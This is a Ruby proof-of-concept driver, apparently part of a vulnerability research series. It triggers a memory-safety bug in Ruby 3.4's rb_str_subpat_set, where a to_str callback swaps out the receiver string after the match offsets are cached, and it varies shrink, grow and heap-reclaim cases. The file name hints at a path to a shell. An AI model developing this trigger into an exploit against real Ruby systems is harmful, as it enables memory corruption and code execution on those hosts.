# W333: adjacent Ruby 3.4.12 -> 3.4.13 string.c fix differential.
#
# rb_str_subpat_set (3.4.12 string.c:5843-5863) caches the regexp backref
# offsets start/end/len before StringValue(val); a Ruby `to_str` callback can
# then replace the receiver. 3.4.13 (:5895-5902) adds
#   if (start + len > RSTRING_LEN(str)) rb_raise("string modified")
# but still uses the cached offsets afterwards.
#
# W320 covered whole-match / vlen<len / shrink (negative-size memmove) and
# W321 covered whole-match / vlen==len / shrink (N-1 chosen bytes). This
# driver tests the untested shapes: nonzero capture offsets, vlen==0's
# rb_str_drop_bytes early return, receiver growth, and multibyte receivers.
# In-process only: no wire input, no monkey patch, no debugger write.
#
# Usage:
#   ruby ruby2shell-backref-coercion.rb
# Env: W333_MUT=none|shrink|shrink1|grow|reclaim|self
#      W333_CAP=0|1|2   W333_VLEN=<integer>   W333_OFF=<prefix bytes>
#      W333_MATCH=<match bytes>  W333_TAIL=<suffix bytes>
#      W333_WHOLE=1        match the whole receiver (backref start=0)
$mut = ENV.fetch('W333_MUT', 'none')
$cap = Integer(ENV.fetch('W333_CAP', '1'))
$vlen = Integer(ENV.fetch('W333_VLEN', '3'))
$off = Integer(ENV.fetch('W333_OFF', '32'))
$match = Integer(ENV.fetch('W333_MATCH', '8'))
$tail = Integer(ENV.fetch('W333_TAIL', '256'))
$enc = ENV.fetch('W333_ENC', 'binary')
$fill = Integer(ENV.fetch('W333_FILL', '90')).chr
$did = false

if $enc == 'utf8'
  # Each prefix/match/suffix codepoint is two bytes: byte offsets differ
  # from character offsets. The regexp captures the run of U+00DF.
  unit_a = "\u00e9"; unit_b = "\u00df"; unit_c = "\u00e7"
  s_re = $cap == 2 ? /(\u00e9+)(\u00df+)/ : /(\u00df+)/
else
  unit_a = 'A'; unit_b = 'B'; unit_c = 'C'
  s_re = $cap == 2 ? /(A+)(B+)/ : /(B+)/
end
$s = ((unit_a * $off) + (unit_b * $match) + (unit_c * $tail)).dup
if ENV['W333_WHOLE'] == '1'
  s_re = /\A.*\z/m
  $cap = 0
end

repl = Object.new
repl.define_singleton_method(:to_str) do
  unless $did
    $did = true
    case $mut
    when 'shrink'
      $s.replace('X')
    when 'shrink1'
      $s.replace('X' * ($match - 1))
    when 'grow'
      $s.replace($s + ('D' * 8192))
    when 'reclaim'
      $s.replace('X')
      $junk = Array.new(64) { 'Y' * 4096 }
    when 'self'
      $s.replace('X')
      return $s
    end
  end
  $fill * $vlen
end

begin
  $s[s_re, $cap] = repl
  bytes = $s.bytes
  head = bytes.first(16).map { |b| '%02x' % b }.join
  chosen = bytes.first(8192).count($fill.ord)
  puts "RESULT mut=#{$mut} cap=#{$cap} vlen=#{$vlen} off=#{$off} match=#{$match} " \
       "enc=#{$enc} whole=#{ENV['W333_WHOLE'] || '0'} len=#{$s.bytesize} head=#{head} chosen=#{chosen}"
rescue => e
  puts "RESULT mut=#{$mut} cap=#{$cap} vlen=#{$vlen} off=#{$off} match=#{$match} " \
       "enc=#{$enc} whole=#{ENV['W333_WHOLE'] || '0'} raised=#{e.class}: #{e.message}"
end
